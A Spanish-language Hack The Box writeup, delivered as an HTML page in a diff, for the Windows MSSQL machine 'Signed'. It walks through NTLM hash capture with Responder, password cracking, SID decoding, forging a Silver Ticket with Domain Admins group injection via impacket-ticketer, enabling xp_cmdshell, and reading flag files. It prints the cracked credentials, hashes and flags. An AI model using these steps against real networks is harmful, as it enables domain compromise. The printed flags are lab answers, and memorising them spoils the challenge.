@@ -1,0 +1,217 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
+<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
+← Volver a Writeups
+</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Signed Hack The Box </h1> <p class="text-slate-400 text-sm mb-2">13 de enero de 2026</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Signed es una máquina Windows enfocada en la explotación avanzada de MSSQL. </p> </div> <!-- BLOQUE DE INFORMACIÓN TÉCNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">Detalles Técnicos</h2> <ul class="space-y-2 text-slate-300">    <li><strong>Dificultad:</strong> Medium</li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">Etiquetas y Tecnología</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> mssql </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> silver ticket </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> impacket </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <p><img alt="alt text" loading="lazy" decoding="async" fetchpriority="auto" width="943" height="389" src="/assets/image.DY2Y71KZ_124vOx.webp" ></p>
+<p><strong>Servicio Principal:</strong> Microsoft SQL Server 2022 (Puerto 1433)</p>
+<p><strong>Data:</strong> <code>scott</code>: <code>Sm230#C5NatH</code></p>
+<hr>
+<h2 id="1-reconocimiento-y-enumeración">1. Reconocimiento y Enumeración</h2>
+<p>Comenzamos escaneando el objetivo, identificando que el puerto <strong>1433</strong> está abierto y ejecutando Microsoft SQL Server 2022. La información de NTLM revela que el nombre del host es <strong>DC01</strong> y el dominio es <strong>SIGNED.HTB</strong>.</p>
+<p><strong>Resultado del Escaneo:</strong></p>
+<ul>
+<li><strong>Puerto:</strong> 1433/tcp</li>
+<li><strong>Servicio:</strong> ms-sql-s</li>
+<li><strong>Versión:</strong> Microsoft SQL Server 2022 16.00.1000.00; RTM</li>
+<li><strong>Dominio:</strong> SIGNED.HTB</li>
+</ul>
+<hr>
+<h2 id="2-acceso-inicial">2. Acceso Inicial</h2>
+<p>Con las credenciales nos conectamos al servicio SQL utilizando <code>impacket-mssqlclient</code>.</p>
+<p><strong>Comando de conexión:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">impacket-mssqlclient</span><span style="color:#F1FA8C"> scott:Sm230#C5NatH@10.10.11.90</span></span></code></pre>
+<p>Una vez dentro, enumeramos las bases de datos disponibles:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#FF79C6">SELECT</span><span style="color:#FF79C6"> name</span><span style="color:#FF79C6"> FROM</span><span style="color:#BD93F9"> master</span><span style="color:#F8F8F2">.</span><span style="color:#BD93F9">dbo</span><span style="color:#F8F8F2">.sysdatabases;</span></span></code></pre>
+<p><strong>Salida:</strong> <code>master</code>, <code>tempdb</code>, <code>model</code>, <code>msdb</code>.</p>
+<hr>
+<h2 id="3-escalada-de-privilegios-movimiento-lateral">3. Escalada de Privilegios (Movimiento Lateral)</h2>
+<p>Para avanzar, fue necesario comprometer la cuenta de servicio <code>mssqlsvc</code>. Esto se logró interceptando una autenticación del servidor.</p>
+<p><strong>Procedimiento (Responder + Hashcat):</strong></p>
+<ol>
+<li>
+<p><strong>Captura (Sudo Responder):</strong> Se ejecutó la herramienta <strong>Responder</strong> con privilegios de superusuario (<code>sudo responder ...</code>) en la máquina atacante para escuchar y envenenar las solicitudes de red, logrando capturar el hash NTLMv2 de la cuenta de servicio.</p>
+</li>
+<li>
+<p><strong>Cracking (Hashcat):</strong> El hash capturado se procesó utilizando <strong>Hashcat</strong>, logrando descifrar la contraseña en texto claro.</p>
+</li>
+</ol>
+<p>Se obtienen credenciales para la cuenta de servicio <code>mssqlsvc</code>. Es posible calcular el hash NTLM de esta contraseña para técnicas de <em>Pass-the-Hash</em>, o usarla en texto claro.</p>
+<p><strong>Credenciales de Servicio:</strong></p>
+<ul>
+<li><strong>Usuario:</strong> <code>mssqlsvc</code></li>
+<li><strong>Contraseña:</strong> <code>purPLE9795!@</code></li>
+<li><strong>Hash NTLM:</strong> <code>ef699384c3285c54128a3ee1ddb1a0cc</code></li>
+</ul>
+<p><strong>Cálculo del Hash (Referencia):</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> -n</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">purPLE9795!@</span><span style="color:#E9F284">'</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> iconv</span><span style="color:#BD93F9"> -f</span><span style="color:#F1FA8C"> UTF-8</span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> UTF-16LE</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> openssl</span><span style="color:#F1FA8C"> md4</span></span>
+<span class="line"><span style="color:#50FA7B">MD4(stdin</span><span style="color:#F8F8F2">)= ef699384c3285c54128a3ee1ddb1a0cc</span></span></code></pre>
+<p>Nos reconectamos utilizando la cuenta de servicio y autenticación de Windows:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">impacket-mssqlclient</span><span style="color:#F1FA8C"> mssqlsvc:</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">purPLE9795!@</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">@10.10.11.90</span><span style="color:#BD93F9"> -windows-auth</span></span></code></pre>
+<hr>
+<h2 id="4-configuración-del-entorno-para-exfiltración">4. Configuración del Entorno para Exfiltración</h2>
+<p>Con las credenciales de <code>mssqlsvc</code>, podríamos entrar, pero para asegurar privilegios administrativos completos (<code>sysadmin</code>/<code>dbo</code>), realizaremos un ataque de <strong>Silver Ticket</strong>. Para ello, necesitamos el <strong>SID del Dominio</strong>.</p>
+<p>Dentro de SQL, consultamos el SID binario del usuario actual:</p>
+<p>SQL</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SELECT SUSER_SID(SYSTEM_USER);</span></span>
+<span class="line"><span>-- Resultado: 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000</span></span></code></pre>
+<h3 id="desglose-estructural-del-sid">Desglose Estructural del SID</h3>
+<p>Secuencia Hexadecimal segmentada por función:</p>
+<p><code>01</code> <code>05</code> <code>000000000005</code> <code>15000000</code> <code>5b7bb0f3</code> <code>98aa2245</code> <code>ad4a1ca4</code> <code>4f040000</code></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th><strong>Segmento Hex</strong></th><th><strong>Componente</strong></th><th><strong>Valor Decimal / Decodificación</strong></th></tr></thead><tbody><tr><td><strong><code>01</code></strong></td><td>Revisión</td><td><strong>S-1</strong></td></tr><tr><td><strong><code>05</code></strong></td><td>Conteo de Sub-autoridades</td><td><strong>5</strong> (Indica que siguen 5 bloques de 4 bytes)</td></tr><tr><td><strong><code>000000000005</code></strong></td><td>Autoridad Identificadora</td><td><strong>5</strong> (NT Authority)</td></tr><tr><td><strong><code>15000000</code></strong></td><td>Sub-autoridad 1 (Fijo)</td><td><strong>21</strong> (NT Non-Unique)</td></tr><tr><td><strong><code>5b7bb0f3</code></strong></td><td>ID de Dominio Parte 1</td><td><strong>4088429403</strong> (Little Endian: 0xF3B07B5B)</td></tr><tr><td><strong><code>98aa2245</code></strong></td><td>ID de Dominio Parte 2</td><td><strong>1159899800</strong> (Little Endian: 0x4522AA98)</td></tr><tr><td><strong><code>ad4a1ca4</code></strong></td><td>ID de Dominio Parte 3</td><td><strong>2753317549</strong> (Little Endian: 0xA41C4AAD)</td></tr><tr><td><strong><code>4f040000</code></strong></td><td><strong>RID (Identificador Relativo)</strong></td><td><strong>1103</strong> (Little Endian: 0x044F)</td></tr></tbody></table>
+<p><strong>Nota técnica:</strong> Los valores numéricos de las sub-autoridades (Dominio y RID) se almacenan en formato <strong>Little Endian</strong>. Para calcular su valor, se debe invertir el orden de los bytes de cada bloque de 4 (ejemplo RID: <code>4f 04 00 00</code>  <code>00 00 04 4f</code>).</p>
+<p><strong>Análisis del SID Binario</strong></p>
+<p>El valor hexadecimal devuelto confirma que estás ejecutando la consulta bajo la cuenta de servicio (<code>MSSQLSVC</code>).</p>
+<p><strong>Desglose Hexadecimal a Decimal:</strong></p>
+<ol>
+<li><strong>Cabecera:</strong> <code>010500000000000515000000</code> (Estándar para cuentas de dominio).</li>
+<li><strong>Parte 1 Dominio:</strong> <code>5b7bb0f3</code> (Little Endian) -> <code>0xF3B07B5B</code> -> <strong>4088429403</strong></li>
+<li><strong>Parte 2 Dominio:</strong> <code>98aa2245</code> (Little Endian) -> <code>0x4522AA98</code> -> <strong>1159899800</strong></li>
+<li><strong>Parte 3 Dominio:</strong> <code>ad4a1ca4</code> (Little Endian) -> <code>0xA41C4AAD</code> -> <strong>2753317549</strong></li>
+<li><strong>RID (Usuario actual):</strong> <code>4f040000</code> (Little Endian) -> <code>0x044F</code> -> <strong>1103</strong></li>
+</ol>
+<p>Identidad Confirmada:</p>
+<p>Este SID corresponde exactamente a:</p>
+<p>S-1-5-21-4088429403-1159899800-2753317549-1103 (Tu MSSQLSVC_RID).</p>
+<h3 id="resolución-del-objetivo-rid-1105">Resolución del Objetivo (RID 1105)</h3>
+<p>Para obtener el nombre del usuario <code>IT_RID</code> (1105) usando el puerto 1433, debes inyectar el RID 1105 en la estructura binaria.</p>
+<p>b’0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000’</p>
+<p><strong>Cálculo:</strong></p>
+<ul>
+<li>
+<p>RID Objetivo: <code>1105</code></p>
+</li>
+<li>
+<p>Hexadecimal: <code>0x0451</code></p>
+</li>
+<li>
+<p>Little Endian (4 bytes): <code>51040000</code></p>
+</li>
+</ul>
+<p>Comando de Enumeración Manual:</p>
+<p>Reemplaza los últimos 4 bytes del SID actual (4f040000) por el RID objetivo (51040000):</p>
+<p>SQL</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000);</span></span></code></pre>
+<p>Resultado esperado:</p>
+<p>El servidor devolverá DOMINIO\NombreUsuario asociado al RID 1105.</p>
+<hr>
+<h2 id="4-escalada-de-privilegios-silver-ticket-attack">4. Escalada de Privilegios: Silver Ticket Attack</h2>
+<p>Teniendo el Hash NTLM de la cuenta de servicio y el SID del dominio, podemos falsificar un Ticket de Servicio (TGS) Kerberos, conocido como <strong>Silver Ticket</strong>. Esto nos permite autenticarnos como cualquier usuario (o nosotros mismos) pero inyectando membresía en grupos privilegiados dentro del PAC del ticket.</p>
+<p>Generación del Ticket:</p>
+<p>Usamos impacket-ticketer para inyectar los grupos 512 (Domain Admins) y 1105 (IT).</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc \</span></span>
+<span class="line"><span>-domain-sid S-1-5-21-4088429403-1159899800-2753317549 \</span></span>
+<span class="line"><span>-domain SIGNED.HTB \</span></span>
+<span class="line"><span>-spn MSSQLSvc/sql.signed.htb:1433 \</span></span>
+<span class="line"><span>-groups 512,1105 \</span></span>
+<span class="line"><span>-user-id 1103 mssqlsvc</span></span></code></pre>
+<p>Carga del Ticket:</p>
+<p>Exportamos la variable de entorno para que las herramientas de Impacket usen nuestro ticket falsificado.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"</span></span></code></pre>
+<p>Conexión vía Kerberos:</p>
+<p>Es vital usar el nombre de host (FQDN) sql.signed.htb y el flag -k.</p>
+<p>Bash</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>impacket-mssqlclient -k -no-pass sql.signed.htb</span></span></code></pre>
+<p><em>Salida exitosa:</em> <code>SQL (SIGNED\mssqlsvc dbo@master)></code> (Acceso como dbo).</p>
+<p><strong>Pasos de configuración:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell</span></span>
+<span class="line"><span>INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.</span></span>
+<span class="line"><span>INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.</span></span>
+<span class="line"><span>SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE</span></span></code></pre>
+<p><em>Explicación:</em> Permite el uso de funciones como <code>OPENROWSET</code> para conectar a fuentes de datos externas o leer archivos locales.</p>
+<ul>
+<li>
+<p><strong><code>sp_configure</code>:</strong> Procedimiento almacenado del sistema para mostrar o cambiar opciones de configuración global del servidor actual.</p>
+</li>
+<li>
+<p><strong><code>'show advanced options', 1</code>:</strong> Por defecto, SQL Server oculta las opciones peligrosas o avanzadas. Este comando cambia el bit de configuración para hacerlas visibles y modificables.</p>
+</li>
+<li>
+<p><strong><code>RECONFIGURE</code>:</strong> Comando crítico que actualiza el valor configurado actualmente (el que se está ejecutando) con el valor que acabas de establecer. Sin esto, el cambio queda en cola y no tiene efecto inmediato.</p>
+</li>
+</ul>
+<hr>
+<h2 id="5-captura-de-flags-loot">5. Captura de Flags (Loot)</h2>
+<p>Con la configuración lista, utilizamos la función <code>OPENROWSET</code> con el proveedor <code>BULK</code> para leer el contenido de los archivos de texto en el sistema de archivos.</p>
+<h3 id="user-flag">User Flag</h3>
+<p>Leemos el archivo del escritorio del usuario <code>mssqlsvc</code>.</p>
+<p><strong>Comando:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#FF79C6">SELECT</span><span style="color:#FF79C6"> *</span><span style="color:#FF79C6"> FROM</span><span style="color:#8BE9FD"> OPENROWSET</span><span style="color:#F8F8F2">(BULK </span><span style="color:#F1FA8C">N</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">C:\Users\mssqlsvc\Desktop\user.txt</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">SINGLE_CLOB</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">AS</span><span style="color:#F8F8F2"> Contents;</span></span></code></pre>
+<p><strong>Resultado (Flag):</strong>
+<code>2cf3f5ee01f863a66ff8a6c6d397e0c7</code></p>
+<h3 id="root-flag">Root Flag</h3>
+<p>Leemos el archivo del escritorio del Administrador.</p>
+<p><strong>Comando:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="color:#FF79C6">SELECT</span><span style="color:#FF79C6"> *</span><span style="color:#FF79C6"> FROM</span><span style="color:#8BE9FD"> OPENROWSET</span><span style="color:#F8F8F2">(BULK </span><span style="color:#F1FA8C">N</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">C:\Users\Administrator\Desktop\root.txt</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">SINGLE_CLOB</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">AS</span><span style="color:#F8F8F2"> t;</span></span></code></pre>
+<p><strong>Resultado (Flag):</strong></p>
+<p><code>ad05f1cff8b0fce8f5c1a700918df614</code></p>
+<hr>
+<h2 id="apéndice-técnico-explicación-de-comandos">Apéndice Técnico: Explicación de Comandos</h2>
+<p>Para entender mejor el ataque, aquí se desglosan los comandos SQL críticos utilizados:</p>
+<h3 id="openrowset-y-bulk">OPENROWSET y BULK</h3>
+<ul>
+<li><strong><code>OPENROWSET</code>:</strong> Permite a SQL Server acceder a datos externos. Aquí se usa para leer el sistema de archivos local.</li>
+<li><strong><code>BULK</code>:</strong> Especifica que se leerá un archivo de datos sin formato.</li>
+<li><strong><code>SINGLE_CLOB</code>:</strong> Carga todo el contenido del archivo en una sola celda de texto, ideal para leer flags completas o archivos de configuración.</li>
+</ul>
+<h3 id="xp_cmdshell-alternativa">xp_cmdshell (Alternativa)</h3>
+<p>Aunque en este caso usamos <code>OPENROWSET</code>, otra técnica común es <code>xp_cmdshell</code>.</p>
+<ul>
+<li><strong>Comando:</strong> <code>EXEC xp_cmdshell 'type C:\Ruta\Archivo';</code></li>
+<li><strong>Función:</strong> Genera una shell de comandos de Windows (<code>cmd.exe</code>) bajo el contexto de seguridad de la cuenta de servicio SQL (<code>mssqlsvc</code>).</li>
+<li><strong>Diferencia:</strong> <code>OPENROWSET</code> depende de permisos de lectura de archivos, mientras que <code>xp_cmdshell</code> ejecuta binarios. Si uno falla, el otro puede funcionar.</li>
+</ul> </div> <!-- FOOTER DEL ARTÍCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de writeups
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2026 Angel Corral - Todos los derechos reservados.
+</div> </footer> </div> </body></html>
